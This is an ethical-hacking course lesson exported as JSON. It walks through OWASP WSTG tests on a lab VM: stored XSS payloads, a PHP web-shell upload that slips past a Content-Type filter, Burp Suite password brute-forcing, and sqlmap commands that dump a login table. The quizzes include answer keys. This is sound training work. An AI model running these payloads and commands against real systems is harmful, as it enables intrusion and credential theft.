+                "node_key": "da513f0b-ee1a-4c87-a88d-ca625bb51a5c",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "question": {
+                "complex_prompt": {
+                  "text": "Place the tests in the correct OWASP Testing Guide category"
+                },
+                "concepts_label": "OWASP Testing Guide Category",
+                "answers_label": "Test",
+                "concepts": [
+                  {
+                    "text": "Information Gathering",
+                    "correct_answer": {
+                      "id": "a1603727008253",
+                      "text": "Test HTTP Methods"
+                    }
+                  },
+                  {
+                    "text": "Authentication Testing",
+                    "correct_answer": {
+                      "id": "a1603727125381",
+                      "text": "Testing for Default Credentials"
+                    }
+                  },
+                  {
+                    "text": "Input Validation Testing",
+                    "correct_answer": {
+                      "id": "a1603727239891",
+                      "text": "Testing for SQL Injection"
+                    }
+                  },
+                  {
+                    "text": "Business Logic Testing",
+                    "correct_answer": {
+                      "id": "a1603727283174",
+                      "text": "Test Upload of Malicious Files"
+                    }
+                  }
+                ],
+                "answers": [
+                  {
+                    "id": "a1603727008253",
+                    "text": "Test HTTP Methods"
+                  },
+                  {
+                    "id": "a1603727125381",
+                    "text": "Testing for Default Credentials"
+                  },
+                  {
+                    "id": "a1603727283174",
+                    "text": "Test Upload of Malicious Files"
+                  },
+                  {
+                    "id": "a1603727239891",
+                    "text": "Testing for SQL Injection"
+                  }
+                ]
+              }
+            },
+            {
+              "id": 1089693,
+              "key": "aba409f7-f9f8-4478-88fe-d49a15f89cb8",
+              "title": "Using OWASP Hard Quiz",
+              "semantic_type": "RadioQuizAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "aba409f7-f9f8-4478-88fe-d49a15f89cb8",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "question": {
+                "prompt": "What is the objective of Test WSTG-INFO-01?",
+                "answers": [
+                  {
+                    "id": "rbk1",
+                    "text": "Check which server the website is running",
+                    "is_correct": false
+                  },
+                  {
+                    "id": "rbk2",
+                    "text": "Check which sensitive information is exposed on a public website",
+                    "is_correct": true
+                  },
+                  {
+                    "id": "a1603726637467",
+                    "text": "Check which application framework the website is using",
+                    "is_correct": false
+                  }
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "id": 1089699,
+          "key": "849b5b87-90d4-4033-b654-8b344781c0d0",
+          "title": "Exercise: Using OWASP WSTG",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "849b5b87-90d4-4033-b654-8b344781c0d0",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1089696,
+              "key": "5dc4b982-47d7-4f01-a7a6-ed5194221bed",
+              "title": "Exercise: Using OWASP Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Audit `svba.local`  For Stored Cross-Site Scripting",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089697,
+              "key": "6c5818c8-154d-4ef0-92ce-8ee56ba06d77",
+              "title": "Exercise: Using OWASP Instructions",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "Your goal for this exercise is to use OWASP WSTG to conduct a test for Stored Cross-Site Scriping. \n\n* Target: `http://sbva.local` on the SBVA virtual machine.\n* Test: **WSTG-INPV-02 **(Stored Cross-Site Scripting)\n* Testing environment: **Black-Box**\n\nIf you are not familiar with JavaScript Code, read the **WSTG-INPV-01** (Reflected Cross-Site Scripting) before starting this exercise.",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089698,
+              "key": "f6b0a4a3-4c54-4449-93d6-fc6197245dc9",
+              "title": "Testing For Stored Cross-Site Scripting",
+              "semantic_type": "TaskListAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "f6b0a4a3-4c54-4449-93d6-fc6197245dc9",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "tasks": [
+                "If you are unfamiliar with JavaScript, read OWASP **WSTG-INPV-01**",
+                "Read OWASP **WSTG-INPV-02**",
+                "Run the test using the Black-Box methodology "
+              ],
+              "positive_feedback": "Great Job!\nClick on next to see my solution",
+              "video_feedback": null,
+              "description": " The target for this test is `http://sbva.local` on the SBVA virtual machine."
+            }
+          ]
+        },
+        {
+          "id": 1089704,
+          "key": "5bc645bc-26e9-4a70-8b22-1e111c6eabb4",
+          "title": "Solution: Using OWASP WSTG",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "5bc645bc-26e9-4a70-8b22-1e111c6eabb4",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1089700,
+              "key": "c7a7d7d2-16f6-4fb6-a230-b829c174033a",
+              "title": "Solution: Using OWASP Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## My Solution",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1131434,
+              "key": "0aa6337d-ea20-4298-af91-c3130ed9db78",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Learning About The Test",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089701,
+              "key": "b4b96564-ab68-4eaf-a6ee-878d7adfc86d",
+              "title": "ND350 EHND C1 L3 A06a Understanding The Test V2",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": "",
+              "video": {
+                "youtube_id": "dfvHHUzQ6fQ",
+                "china_cdn_id": "dfvHHUzQ6fQ.mp4"
+              }
+            },
+            {
+              "id": 1132858,
+              "key": "b9ac9e6e-d2c3-4750-bf6c-f8bd30d131c3",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Getting Started\n\n1. Find the page for **WSTG-INPV-02 (Testing for Stored Cross Site Scripting)** on <a href=\"https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting.html\" target=\"_blank\">OWASP WSTG 4.1</a>\n1. Review the **Test Summary**\n3. Review **Black-Box Testing**  in the **How to Test** section\n1. Explore the `sbva.local` application to find a page with an input form as required by the black-box testing approach.  `http://sbva.local/create.php` seems to be a perfect candidate for testing XSS because it is storing user inputs and also rendering them as HTML  code in a table displayed on the home page.",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1130393,
+              "key": "80bceb53-d67a-4564-9ee6-f7ba318039f0",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Testing For XSS",
+              "instructor_notes": null
+            },
+            {
+              "id": 1127827,
+              "key": "80d645d7-e0b5-4e0b-8bc2-d0db781b77d2",
+              "title": "ND350 EHND C1 L3 A06b Testing For XXS V2",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": "",
+              "video": {
+                "youtube_id": "ySC726nzfUI",
+                "china_cdn_id": "ySC726nzfUI.mp4"
+              }
+            },
+            {
+              "id": 1089702,
+              "key": "ffcffc4e-8845-46e4-a2db-60b1ad9e80fa",
+              "title": "Solution: Using OWASP Summary",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Running The Test\n\n1. Copy the first payload from** **the **Testing for Stored XSS **section under the Black-Box Testing approach.\n<br><br>\n1. Browse to  `http://sbva.local` and click on the **Rate Us**  button to open a form with input fields.\n```bash\naaa@aa.com&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;\n```\n\n1. Paste the copied payload into the form and submit.<br>\n***It does not work!***<br><br>\n1. Try again with the second payload in **WSTG-INPV-02**\n```bash\naaa@aa.com%22%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E\n```\n***It still does not work! ***\n<br>\n\n### Troubleshooting\n\nDon't worry if your troubleshooting steps didn't work and you weren't able to demonstrate the XSS vulnerability. This was a difficult challenge!  But do notice the importance of persistence. Don't give up too easily!\n\n1. Use the portion of the payload starting from the script tag in the name and message field.\n```html\n<script>alert(document.cookie)</script>\n```\n***Two alerts are generated with the web session cookie value***\n<br><br>\n1. To ensure that both of the fields are vulnerable, replace `document.cookie` with `1` and `2` respectively for the name and message fields.\n```html\n<script>alert(1)</script>\n<script>alert(2)</script>\n```\n***Two alerts are generated with the value 1 and 2  confirming that both fields are vulnerable***",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1132874,
+              "key": "991d157d-a15a-4738-9090-471809741982",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Further Reading\n\nHere is a list of hundreds of XSS payloads that you can use in your testing:  [XSS Payloads](https://github.com/payloadbox/xss-payload-list) ",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089703,
+              "key": "79702541-dee2-4d28-aa83-0dc81d33119a",
+              "title": "Thinking Like an Ethical Hacker",
+              "semantic_type": "ValidatedQuizAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "79702541-dee2-4d28-aa83-0dc81d33119a",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "question": {
+                "prompt": "In this exercise, The javascript payload given on the OWASP WSTG page didn't work.  To find the XSS vulnerability, we had to show persistence ***and*** think creatively. <br><br>\n**What can you do to boost your persistence and creativity? **",
+                "matchers": [
+                  {
+                    "expression": "[^/s]+"
+                  }
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "id": 1089711,
+          "key": "d82cfb9e-7391-4ce6-b567-3e72708f91d4",
+          "title": "Using Semi-Automated Tools",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "d82cfb9e-7391-4ce6-b567-3e72708f91d4",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1089705,
+              "key": "7ea5d846-2eb9-41c6-bb7d-860d2baf120f",
+              "title": "Use BurpSuite Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Introduction To Semi-Automated Tools",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089706,
+              "key": "46e5d216-1d14-46f8-9033-f229b7539a09",
+              "title": "ND350 EHND C1 L3 A07a Intro To Semi Automated Tools V2",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": "",
+              "video": {
+                "youtube_id": "SiA95PTnSA0",
+                "china_cdn_id": "SiA95PTnSA0.mp4"
+              }
+            },
+            {
+              "id": 1123155,
+              "key": "419eeb65-b066-48a8-a368-c0cb9d91cae0",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "Web applications can be tested manually by crafting requests, but this method is slow because only a single request can be sent at a time. \n\nSemi-automated tools solve this problem by allowing an analyst to automate repetitive tasks. They generally work on a proxy-based architecture where the request from the analyst's browser is sent to the tool and forwarded to the target website. \n\nUsing the tool, the request can be modified, forwarded, or dropped.  The tool can also make minor changes to the request and resend it, allowing us to run thousands of test cases efficiently.",
+              "instructor_notes": null
+            },
+            {
+              "id": 1123154,
+              "key": "bc2df921-f29a-4a2f-a9ee-21825bc2a99d",
+              "title": null,
+              "semantic_type": "ImageAtom",
+              "is_public": true,
+              "url": "https://video.udacity-data.com/topher/2021/January/5ff07389_5/5.png",
+              "non_google_url": "https://s3.cn-north-1.amazonaws.com.cn/u-img/bc2df921-f29a-4a2f-a9ee-21825bc2a99d",
+              "caption": "How a Semi-Automated Tool Works",
+              "alt": "Diagram of how a semiautomated process works",
+              "width": 1000,
+              "height": 707,
+              "instructor_notes": null
+            },
+            {
+              "id": 1129810,
+              "key": "7299a9a1-7ced-4f23-b033-517df2e21c7a",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Setting  Up a Project In Burp Suite",
+              "instructor_notes": null
+            },
+            {
+              "id": 1129809,
+              "key": "c4bb4586-b557-475e-abab-7997fb9d2d87",
+              "title": "ND350 EHND C1 L3 A07b Setting Up BurpSuite",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "video": {
+                "youtube_id": "ILNL12nh8UE",
+                "china_cdn_id": "ILNL12nh8UE.mp4"
+              }
+            },
+            {
+              "id": 1129808,
+              "key": "15b6d8eb-677e-49c1-b182-6f0605f58bd6",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "Burp Suite is a commonly used web app testing tool. The community and pro edition are semi-automated and the enterprise edition is fully-automated.\n\n1. Open a terminal and type `burpsuite` to launch it.\n1. Accept the user agreement and click **Next** and **Start Burp**\n1. In the **Target** tab,  click **Add** and enter the target URL:  ` http://sbva.local`\n1. Select **Yes** in the **Proxy history logging** popup to ensure that Burp Suite only looks at this domain\n1. Navigate to **Proxy > Options** and find the Burp Proxy address and port. In my case, it was `127.0.0.1:8080`.\n1. Configure a manual proxy in your browser. In Firefox:\n  1. In **Preferences** search for proxy. \n   2. Click on **Settings** and add a  **Manual Proxy **  using the HTTP proxy and port from Burp Suite.\n   3. Click **OK** to save\n1. Open ` http://sbva.local` in the browser.  The request will be routed to Burp Suite.\n1. The request will appear in the **Intercept tab **  in the **Proxy** section of Burp Suite.  If you do not see a request, click the  **Intercept is off** button to turn the intercept on.\n1. Click **Drop** to drop the request \n1. Turn intercept off by clicking the **Intercept is on** button.",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1129807,
+              "key": "1f24d79c-d8de-405e-bfd8-6689fbac3b88",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Using Burp Suite To Perform A Dictionary Brute-force Attack",
+              "instructor_notes": null
+            },
+            {
+              "id": 1129806,
+              "key": "2cb72c57-97c0-4545-9218-0ef72861b0dd",
+              "title": "ND350 EHND C1 L3 A07c Bruteforcing",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "video": {
+                "youtube_id": "yHZ3R_Hltdk",
+                "china_cdn_id": "yHZ3R_Hltdk.mp4"
+              }
+            },
+            {
+              "id": 1089707,
+              "key": "db49738b-43a6-4cae-83e0-8f72857331a8",
+              "title": "Use BurpSuite Notes",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "A Dictionary brute-force attack involves trying a lot of passwords from a password list file. This means that we will be sending the same request but with a minor change which is a password. This task is impractical if done manually since there might be millions of passwords in a password list. Hence burp suite can be used to do this effeciently.\n\n1. In your browser, navigate to ` http://sbva.local/login.php` and try to login with an incorrect username and password to create a request.\n1. Locate the request in the **HTTP History** tab in Burp Suite\n1. Right-click on the request and select  **Send to Intruder**\n1. In **Intruder  > Positions**,  clear the marked positions by clicking **Clear** \n1. Change the username as `alice` and password to `abc`\n1. Select `abc` and click **Add** to add it as a position\n1. Create a list of passwords to check in a text file\n1. In  **Intruder > Payloads **,  load the password list\n1. In ** intruder > Options**. Clear everything in grep match and add the \"Welcome\" keyword which is sent to the page after a successful login\n1. Click on **Start attack**\n1.  View and analyze the results",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1127817,
+              "key": "a040e118-46ef-4149-bc1f-7b4ffb6ddbbd",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### New Terms\n\n<div class=\"index-module--table-responsive--1zG6k\"><table class=\"index-module--table--8j68C index-module--table-striped--3HHC-\">\n<thead>\n<tr>\n<th>Term</th>\n<th>Definition</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Burp Suite</td>\n<td>A suite of application security testing tools developed by Portswigger.</td>\n</tr>\n<tr>\n<td>Dictionary Brute Force Attack</td>\n<td>A password cracking attack that tries every combination of usernames and passwords from a list.</td>\n</tr>\n<tr>\n<td>Intruder Tab</td>\n<td>A Burp Suite tab used to automate sending a request with multiple minor changes</td>\n</tr>\n<tr>\n<td>Proxy</td>\n<td>A system placed in the middle of an active communication between a  client and server. When a client sends a request to the server, it is routed through the proxy before reaching the server. Similarly, when the server returns a response, it routes through the proxy before reaching the client.</td>\n</tr>\n<tr>\n<td>Proxy Tab</td>\n<td>A Burp Suite tab used to intercept a request and modify, forward, or drop it. It can also be used to check previously sent requests and responses.</td>\n</tr>\n<tr>\n<td>Semi-Automated Tools</td>\n<td>Proxy-based tools that intercept a request from the analyst's browser and modify, forward, or drop it. These tools can automate sending and analyzing thousands of requests to increase testing efficiency</td>\n</tr>\n</tbody>\n</table>\n</div>",
+              "instructor_notes": null
+            },
+            {
+              "id": 1122952,
+              "key": "3d01188d-0b99-431e-ac3b-c2fce62d2bd4",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Further Reading\n\n* To learn more about Burp Suite, read this guide in Kali Linux Tutorials:  <a href=\"https://kalilinuxtutorials.com/burpsuite/\" target=\"_blank\">Burpsuite – A Beginner’s Guide For Web Application Security or Penetration Testing</a>.  It covers all of the tabs and functions of Burp Suite in detail.\n* OWASP ZAP is an open-source semi-automated that is similar to Burp Suite. You can learn about the differences between the two in this Jaw33sh Blog post: <a href=\"https://jaw33sh.wordpress.com/2020/11/22/burp-suite-vs-owasp-zap-a-comparison-series/\" target=\"_blank\">Burp Suite vs OWASP ZAP – a Comparison series</a>.",
+              "instructor_notes": null
+            }
+          ]
+        },
+        {
+          "id": 1089715,
+          "key": "927c1e08-1ccf-4303-bd0a-902f558795dc",
+          "title": "Quizzes: Semi-Automated Tools",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "927c1e08-1ccf-4303-bd0a-902f558795dc",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1089712,
+              "key": "41ad6d00-bbe9-4e39-9ede-f766da6f97f6",
+              "title": "Use BurpSuite Quizzes Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "##  Thinking About Use BurpSuite",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089713,
+              "key": "e3663e11-017a-4132-ba11-dad7695abb6f",
+              "title": "Use BurpSuite Easy Quiz",
+              "semantic_type": "RadioQuizAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "e3663e11-017a-4132-ba11-dad7695abb6f",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "question": {
+                "prompt": "Once a `GET` request is saved in Burp Suite, which tab can be used to change the request type to `POST`, `OPTIONS`, `PUT` and `DELETE` one-by-one as you observe the behavior?",
+                "answers": [
+                  {
+                    "id": "rbk1",
+                    "text": "Intruder",
+                    "is_correct": false
+                  },
+                  {
+                    "id": "rbk2",
+                    "text": "Sequencer",
+                    "is_correct": false
+                  },
+                  {
+                    "id": "a1603730135465",
+                    "text": "Repeater",
+                    "is_correct": true
+                  },
+                  {
+                    "id": "a1603730140035",
+                    "text": "Target",
+                    "is_correct": false
+                  }
+                ]
+              }
+            },
+            {
+              "id": 1090580,
+              "key": "82c9acc6-e8f6-4ae0-a967-28f2124c5596",
+              "title": "Matching Quiz",
+              "semantic_type": "MatchingQuizAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "82c9acc6-e8f6-4ae0-a967-28f2124c5596",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "question": {
+                "complex_prompt": {
+                  "text": "You intercepted a request, edited a parameter, and forwarded the request. Next, you clicked on HTTP History and sent that to another tab where you did a password attack.\nWhich two Burp Suite did you use?"
+                },
+                "concepts_label": "Use Order",
+                "answers_label": "Tabs",
+                "concepts": [
+                  {
+                    "text": "Tab 1",
+                    "correct_answer": {
+                      "id": "a1603730377958",
+                      "text": "Proxy Tab"
+                    }
+                  },
+                  {
+                    "text": "Tab 2",
+                    "correct_answer": {
+                      "id": "a1603730534649",
+                      "text": "Intruder Tab"
+                    }
+                  }
+                ],
+                "answers": [
+                  {
+                    "id": "a1603730377958",
+                    "text": "Proxy Tab"
+                  },
+                  {
+                    "id": "a1603730550430",
+                    "text": "Repeater Tab"
+                  },
+                  {
+                    "id": "a1603730561306",
+                    "text": "Comparer Tab"
+                  },
+                  {
+                    "id": "a1603730557539",
+                    "text": "Target Tab"
+                  },
+                  {
+                    "id": "a1603730534649",
+                    "text": "Intruder Tab"
+                  }
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "id": 1089719,
+          "key": "bdfcf2c5-de06-4509-a543-9ca86fcc14c5",
+          "title": "Exercise: Test Upload of Malicious Files",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "bdfcf2c5-de06-4509-a543-9ca86fcc14c5",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1089716,
+              "key": "6bec2c6b-7f86-4cf5-996d-1df2fdbebedc",
+              "title": "Exercise: Use BurpSuite Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Test Upload of Malicious Files",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089717,
+              "key": "b19c4770-a395-4075-92d2-d68e7fb4fc5b",
+              "title": "Exercise: Use BurpSuite Instructions",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "Your target for this exercise is `http://sbva.local/contact` on the SBVA virtual machine \n\nDuring the information gathering tests, your team found that the application saves all uploaded files in `http://sbva.local/upload`\n\nYour task is to test if the webpage is vulnerable to malicious file uploads using OWASP **WSTG-BUSL-09 **(Test Upload of Malicious Files)\n\nYou should use Burp Suite or OWASP Zap to perform this exercise.",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089718,
+              "key": "b7c3039c-5de0-4e66-a980-cb9b4b2fab7e",
+              "title": "Testing for Upload of  Malicious Files",
+              "semantic_type": "TaskListAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "b7c3039c-5de0-4e66-a980-cb9b4b2fab7e",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "tasks": [
+                "Find and read OWASP **WSTG-BUSL-09**",
+                "Use   OWASP **WSTG-BUSL-09** to test `http://sbva.local/contact` for upload of  malicious files"
+              ],
+              "positive_feedback": "Awesome!\nClick on next to see my solution",
+              "video_feedback": null,
+              "description": ""
+            }
+          ]
+        },
+        {
+          "id": 1089724,
+          "key": "63b8afc8-3d4a-45b4-a570-4852bd2db9fc",
+          "title": "Solution: Test Upload of Malicious Files",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "63b8afc8-3d4a-45b4-a570-4852bd2db9fc",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1089720,
+              "key": "2d0b70b3-0fa5-42d2-a59b-d4e1d3ccd61c",
+              "title": "Solution: Use BurpSuite Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## My Solution",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089721,
+              "key": "f7cc78d5-430e-40e8-a5d0-defcce952583",
+              "title": "ND350 EHND C1 L3 A08 Test Upload Of Malicious Files",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": "",
+              "video": {
+                "youtube_id": "SD4sJb2qnpE",
+                "china_cdn_id": "SD4sJb2qnpE.mp4"
+              }
+            },
+            {
+              "id": 1129533,
+              "key": "8599e94f-c1de-4584-8113-c45e53b1d954",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Testing Upload of Malicious Files\n\n1. Find the page for **WSTG-BUSL-09 (Test Upload of Malicious Files** on <a href=\"https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files.html\" target=\"_blank\">OWASP WSTG 4.1</a>\n<br><br>\n1. Create a PHP payload using code following instructions in the **WebShell Backdoor** section of the page:\n```\n<?php\nif(isset($_REQUEST['rq'])){\necho \"<pre>\";\n$rq= ($_REQUEST['rq']);\n/* Replace CENSORED with system ($rq) to activate the sample */\nCENSORED;\necho \"</pre>\";\ndie;\n}\n?>\n```\nDon't forget to replace the word `CENSORED` with `system ($rq)` as noted in the instructions in the code\n<br><br>\n1. Try to upload the payload file on `http://sbva.local/contact.php`<br>\nIt will respond with an error message stating that only image files are allowed\n<br><br>\n1. Follow  the **Evasion of FIlter**  instructions to  bypass the website file upload checking rules and filters\n  1.  Use  Burp Suite to replace the **Content-Type** header value from **application/x-php** to **image/jpeg**, and forward the request.   \n  2. Verify the file upload bypass by visiting `http://sbva.local/upload/a.php`  (replace `a.php` with the name of the payload file you created) ",
+              "instructor_notes": ""
+            }
+          ]
+        },
+        {
+          "id": 1122405,
+          "key": "b3ee5e9c-cba4-44b3-b73a-f9b7c71e2da5",
+          "title": "Fully Automated Tools",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "b3ee5e9c-cba4-44b3-b73a-f9b7c71e2da5",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1122406,
+              "key": "b5af9c7d-3d7a-4f4e-a285-85bf673e2d1b",
+              "title": "ND350 EHND C1 L3 A09 Using Fully Automated Tools",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "video": {
+                "youtube_id": "vpX1OYSJm80",
+                "china_cdn_id": "vpX1OYSJm80.mp4"
+              }
+            },
+            {
+              "id": 1123157,
+              "key": "bbfbbbac-b747-4461-b9be-acdf3e3b670b",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "Fully automated tools are designed for specific purposes including testing specific vulnerabilities or testing specific products.\n\n* **Testing For Specific Vulnerabilities - **A web application may have a huge testing scope. Fully-Automated tools can test thousands of test cases and payloads specific to one vulnerability on various pages. \n* **Testing For Specific Products - **Web servers, database servers, and application frameworks like WordPress have specific features that make them vulnerable to attack. Each of these requires specific testing which can be time-consuming to set up manually. Fully-Automated tools can do this efficiently.",
+              "instructor_notes": null
+            },
+            {
+              "id": 1123156,
+              "key": "66201a2d-a189-4ced-8594-cc4da0eec413",
+              "title": null,
+              "semantic_type": "ImageAtom",
+              "is_public": true,
+              "url": "https://video.udacity-data.com/topher/2021/January/5ff07ac6_6/6.png",
+              "non_google_url": "https://s3.cn-north-1.amazonaws.com.cn/u-img/66201a2d-a189-4ced-8594-cc4da0eec413",
+              "caption": "Use Cases For Fully-Automated Tools",
+              "alt": "Fully-Automated Tools can use used for vulnerabilities and products",
+              "width": 500,
+              "height": 302,
+              "instructor_notes": null
+            },
+            {
+              "id": 1123158,
+              "key": "a2689d38-294f-4e3a-83d7-6eac5b0870e5",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Using SQLMap For Testing SQL Injection",
+              "instructor_notes": null
+            },
+            {
+              "id": 1123159,
+              "key": "69d8a014-6e4d-4e2c-87b8-b165b3f9422e",
+              "title": "ND350 EHND C1 L3 A10a Generating Request File For SQLMap V2",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "video": {
+                "youtube_id": "FIZ20nWma0w",
+                "china_cdn_id": "FIZ20nWma0w.mp4"
+              }
+            },
+            {
+              "id": 1123160,
+              "key": "8e85c22e-2834-4d81-812b-87e876ee21ec",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "SQLMap is a fully-automated tool used to test a request for SQL Injections. It can perform over 400+ checks using various SQL injection techniques. Though this tool can be used independently using the `--url` parameter, It is advised to use BurpSuite to capture a request and then use the parameter to provide a text file containing the captured request. This ensures that SQLMap gets many additional elements like request headers, cookies, data fields, the request method, etc.\n\n1. Open <a href=\"http://sbva.local/login.php\" target=\"_blank\">http://sbva.local/login.php</a> and capture the request in BurpSuite. \n1. Replace the testing parameter's values with an asterisk (*) sign and save the request to a file `req.txt`\n1. Open a terminal and type `sqlmap -hh` for the extended help menu\n1. Allow SQLMap to analyze the request using `sqlmap -r req.txt`(Answer the questions accordingly)",
+              "instructor_notes": null
+            },
+            {
+              "id": 1129813,
+              "key": "e098b24f-02ec-44a3-a30a-ad124171a63b",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Using SQLMap to Exfiltrate Data",
+              "instructor_notes": null
+            },
+            {
+              "id": 1129812,
+              "key": "f2e25398-56d1-460d-b59e-7e7cab001ea8",
+              "title": "ND350 EHND C1 L3 A10b Testing SQL Injection Using SQLMap",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "video": {
+                "youtube_id": "xJeVAQAjPzU",
+                "china_cdn_id": "xJeVAQAjPzU.mp4"
+              }
+            },
+            {
+              "id": 1129811,
+              "key": "c4ddfa59-26d0-4194-ae72-a2fa84b8d0e0",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "1. Extract all databases on the web application using `sqlmap -r req.txt --dbs`\n1. Select the database named sbva and extract all tables using `sqlmap -r req.txt -D sbva --tables`\n1. Dump the login table using`sqlmap -r req.txt -D sbva -T login --dump`",
+              "instructor_notes": null
+            },
+            {
+              "id": 1123161,
+              "key": "1fcdb32f-f942-4a72-8eaa-39e057014953",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Using Nikto To Audit Web Server Security",
+              "instructor_notes": null
+            },
+            {
+              "id": 1123163,
+              "key": "89d6ce4e-1a1b-4997-ada8-1e2ec45783d6",
+              "title": "ND350 EHND C1 L3 A11 Nikto",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "video": {
+                "youtube_id": "JVeSB0aGnRs",
